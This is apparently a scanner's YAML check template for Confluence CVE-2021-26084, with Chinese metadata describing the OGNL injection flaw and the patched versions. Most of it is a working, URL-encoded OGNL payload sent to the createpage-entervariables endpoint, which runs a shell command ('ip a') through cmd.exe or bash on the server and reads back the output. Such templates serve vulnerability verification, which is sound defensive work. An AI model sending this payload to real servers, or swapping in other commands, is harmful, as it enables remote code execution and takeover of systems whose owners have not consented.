app: Atlassian Confluence
query: app:"Atlassian Confluence"
meta:
  name: confluence-cve-2021-26084
  level: 4
  tags:
    - remote_code_execution
  description: 远程攻击者在经过身份验证或在特定环境下未经身份验证的情况下，通过构造恶意数据执行 OGNL 表达式进行注入攻击，实现在 Confluence
    Server 或 Data Center 上执行任意代码，最终控制服务器。
  homepage: https://www.atlassian.com/software/confluence
  author: 一曲成殇
  references: https://www.wangan.com/p/7fygf70448be5455
  solution: 建议升级至 6.13.23、7.4.11、7.11.6、7.12.5 和 7.13.0 安全版本。
  steps:
    verify_steps:
      type: and
      verify:
        - request:
            method: POST
            path: /pages/createpage-entervariables.action?SpaceKey=x
            redirect: true
            header:
              - Content-Type: application/x-www-form-urlencoded
            params: 'queryString=aaaaaaaa%5Cu0027%2B%7BClass.forName%28%5Cu0027javax.script.ScriptEngineManager%5Cu0027%29.newInstance%28%29.getEngineByName%28%5Cu0027JavaScript%5Cu0027%29.%5Cu0065val%28%5Cu0027var+isWin+%3D+java.lang.System.getProperty%28%5Cu0022os.name%5Cu0022%29.toLowerCase%28%29.contains%28%5Cu0022win%5Cu0022%29%3B+var+cmd+%3D+new+java.lang.String%28%5Cu0022ip+a%5Cu0022%29%3Bvar+p+%3D+new+java.lang.ProcessBuilder%28%29%3B+if%28isWin%29%7Bp.command%28%5Cu0022cmd.exe%5Cu0022%2C+%5Cu0022%2Fc%5Cu0022%2C+cmd%29%3B+%7D+else%7Bp.command%28%5Cu0022bash%5Cu0022%2C+%5Cu0022-c%5Cu0022%2C+cmd%29%3B+%7Dp.redirectErrorStream%28true%29%3B+var+process%3D+p.start%28%29%3B+var+inputStreamReader+%3D+new+java.io.InputStreamReader%28process.getInputStream%28%29%29%3B+var+bufferedReader+%3D+new+java.io.BufferedReader%28inputStreamReader%29%3B+var+line+%3D+%5Cu0022%5Cu0022%3B+var+output+%3D+%5Cu0022%5Cu0022%3B+while%28%28line+%3D+bufferedReader.readLine%28%29%29+%21%3D+null%29%7Boutput+%3D+output+%2B+line+%2B+java.lang.Character.toString%2810%29%3B+%7D%5Cu0027%29%7D%2B%5Cu0027'
          response:
            - name: body
              value: inet6
              type: contains
            - name: body
              value: inet
              type: contains
            - name: code
              value: "200"
              type: equals
  create_at: "2021-11-06 21:10:18"
